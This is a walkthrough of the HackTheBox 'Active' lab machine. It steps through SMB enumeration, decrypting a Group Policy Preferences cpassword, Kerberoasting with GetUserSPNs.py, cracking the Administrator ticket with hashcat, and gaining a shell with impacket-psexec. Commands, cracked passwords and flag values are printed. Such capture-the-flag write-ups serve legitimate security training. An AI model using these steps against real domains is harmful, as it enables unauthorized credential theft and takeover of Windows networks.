---
title: Active - A HackTheBox machine
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
  - active directory
  - windows
  - easy
---
# HTB Active

## User.txt 

We enumerate:

```bash
sudo nmap -sC -sV $ip -Pn
```

Results:

```
Nmap scan report for $ip
Host is up (0.044s latency).
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-09 18:09:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-09T18:10:09
|_  start_date: 2025-01-09T18:07:26
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
```


```
# Enumerate shares in the target:
smbmap -H $ip -r

# Now we connect to the share:
smbclient //$ip/Replication
```


After browsing around we find the file Groups.xml under `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\`. 

```
get Groups.xml
```


This file has the following  content:

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```


The password in the cpassword field within this XML snippet is not in plain text. It is a Base64-encoded string of an AES-256 encrypted password used in Group Policy Preferences (GPP) to store passwords for user accounts, mapped drives, or scheduled tasks. 

However, Microsoft used AES-256 encryption to "secure" these passwords. Microsoft published the AES encryption key for these passwords, making it possible to decrypt them if found.

Decrypt the password:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

Results: `GPPstillStandingStrong2k18`

```
# Now we can access another share:
smbclient  //$ip/Users -U SVC_TGS 

# And we can browse to the flag user.txt at Users>SVC_TGS>Desktop, download it and read it
```

Results: `c9ac484c37a9ec3c833b961718381480`



## Root .txt

**1.** Gather a listing of SPNs in the domain. We will need a set of valid domain credentials and the IP address of a Domain Controller.

```bash
GetUserSPNs.py -dc-ip $ip active.htb/SVC_TGS 
```

**2.** Requesting all TGS Tickets:

```bash
GetUserSPNs.py -dc-ip $ip active.htb/SVC_TGS -request
```

Results:

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ddcb41b8736d03e6fd0aed759dd84e93$4fd73e3eeba2318f3e9db570e88cb04508799b1d076f2af96929f80ae3a2b78623d8f0feda893620b2fac7bf62bbd43178f02f924f8bc51fff60c69173b759a84e7331f4bc7eb1892ac84a1d037ecac49846dc02b71678ccad1515770c2305fb36a93ecc1f88a110bfc62019612916e27e37f7e60aa99a719a6585f54900b32b4fc9405601cfa627e9b8b031a27dc507567d644f26dd29edcce930abb0aac8653b18329c95152690b093b4d1c83d8cb0792d9a41f19abfdeef26e8026c86869455a927f69f6485a6016a314b3b3f11235e35e3a9ff3fa6a51aaaacbb623d3253efdfb0ce97f8affaf3e470718abdbceafb5e41aa096bc4d646f9d46ca3fe0e4eec87b49cfe283d04a941c0cf07a289ca55ad6560c1ec176e811df5871347c5595d0d7a4c9ec09c6425f7792187a77bf9d8bd625eadc709da3bf93ff010a6c1d9e1d89c9cb4f61ff5850d3142b42d26402d1f1a543f392850fa90b2cfd1945dc80d1982e40a4f3a6179601010e8fd54679b69cafb7d6b2ac89949e694c44363a3c1156f3562e0612f7b32db9f572642de6a7cbc40332c4de68032eae74fea3d0f081b9a6a29568f24ab112352d9af0b5b7bd7d92930b234464dd9a0f4317be7d297fe05894b8a9f36eedc701647ec2ee14471be89bef5fe64213c7bca4cbd425384131b88679a67808da8fbe67bcb7f63a525ba1de04f59ef884d8908cf7d466db1bcca002ea41508ab847b87e439cbdf68abddddd8cc18e0325d9a2fa0bd50b2e5c20d00290efd4ab9b7bf210b6099e550df2258e1143388c569b5390854bf6a72a9dd1c251d9ae1e0d0c29e00d98c40d219d564c20093e576af43c51b76f7050ff377c285d31756c5bd076463675fb3b49454d83c4fb241add2e098ec95222b8d58a67cd7a22e6b9f050a92ca1f0ea0295b4e4a62ff01277c424809e63331a6c1f40c386b68a5bb18400abe4c97088642707cfb4f4234da7887cd1e543e0dfddfba3cc347d90bb10bf1a9d81dc818f8e61def33bb443670577451c2579113a845239e2a6c525e554f10333c2d2074964e0c370f5308552460b66189cf060da62553dfdaaeab7010594d91ec4667c8c88d0e49aa6a39d3c085b38f1f3bfaa2dba16b305d364307845f5b09b28ea89955bfbca2e03a38a900a2b4169ddc4e3e65e74960b87fb5cccf912b7ba05b5a8867dafc3014db326640e4b69b86691ca93730934a9ca48e809f167af52428807f6f8f84999058917bd61881
```

**3.** Crack the ticket 

```bash
 hashcat -m 13100 ticketADM /usr/share/wordlists/rockyou.txt
```

Results: Ticketmaster1968

**4.** Access the host with Administrator credentials:

```
impacket-psexec Administrator:Ticketmaster1968@$ip
```

**5.** Print the flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

Results: 10177b515af1e4f19c0ddc821f2c9046